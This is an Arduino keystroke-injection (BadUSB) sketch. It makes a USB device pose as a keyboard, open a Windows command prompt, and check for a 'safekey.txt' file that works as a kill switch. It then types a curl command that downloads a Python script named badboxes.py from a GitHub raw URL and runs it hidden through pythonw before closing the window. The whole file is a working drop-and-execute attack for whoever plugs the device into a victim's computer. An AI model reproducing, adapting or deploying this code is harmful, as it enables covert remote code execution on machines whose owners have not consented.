#include <Keyboard.h>

bool delay_pressing(String str, int dt){
  for(int i=0; i<str.length(); i++){
    char c = str[i];
    Keyboard.press(c);
    delay(dt);
    Keyboard.releaseAll();
  }
  Keyboard.press(0xB0);
  Keyboard.releaseAll();
  return true;
}

void setup() {
  //enter - 0xB0
  //windowns - 0x87
  // for /f "delims=" %i in ('where pythonw') do "%i" badboxes.py


//configure Serial and keyboard
  delay(8000);
  Serial.begin(500);
  Keyboard.begin();
//open cmd
  Keyboard.press(0x87);
  delay(40);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(40);
  delay_pressing("cmd", 20);
  delay(500);
  
//check if safekey exists
  delay_pressing("if exist \"safekey.txt\" echo true > COM3", 20);
  delay(500);

  if (Serial.available() >0) {
    String result = Serial.readStringUntil('\n');
    result.trim();
    if (result == "true"){
      Keyboard.println("exit");
      return;
    }
  }

  delay_pressing("curl -o badboxes.py https://raw.githubusercontent.com/ItaCsl/ArduinoMicroFileStorage/refs/heads/main/badboxes.py", 20);
  delay(500);
  delay_pressing("for /f \"delims=\" %i in ('where pythonw') do \"%i\" badboxes.py", 20);
  delay(50);
  delay_pressing("exit", 20);
}

void loop() {
}
